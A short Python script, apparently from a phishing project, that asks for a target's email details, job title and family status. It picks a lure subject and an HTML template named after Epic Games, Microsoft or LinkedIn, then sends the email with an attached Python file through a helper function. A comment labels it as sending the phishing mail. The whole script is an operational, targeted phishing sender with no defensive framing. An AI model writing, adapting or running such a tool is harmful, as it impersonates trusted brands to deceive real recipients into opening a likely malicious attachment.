from helperFunctions import send_email

# Prompt the user for input
username = input("Enter your user name: ")
mailServiceName = input("Enter your mail service name: ")
title = input("Enter your title: ")
jobTitle = input("Enter your job title: ")
personalStatus = input("Enter your personal status: ")
kidsNumber = input("Enter your number of kids: ")

if (int(kidsNumber) > 0):
    subject = "Parent!"
    html_file_path = "epic_games/epic.html"

match jobTitle:
    case "student":
        subject = "Student!"
        html_file_path = "microsoft.html"
    case "programmer":
        subject = "Programmer!"
        html_file_path = "linkedin.html"
    case "lecturer":
        subject = "Lecturer!"
        html_file_path = "lecturer.html"
    case _:
        pass

# Sending the phising mail
recipient = username + "@" + mailServiceName
attachment_path = "attachment.py"

with open(html_file_path, 'r', encoding="utf-8") as file:
    body = file.read()

send_email(subject, body, recipient, attachment_path)
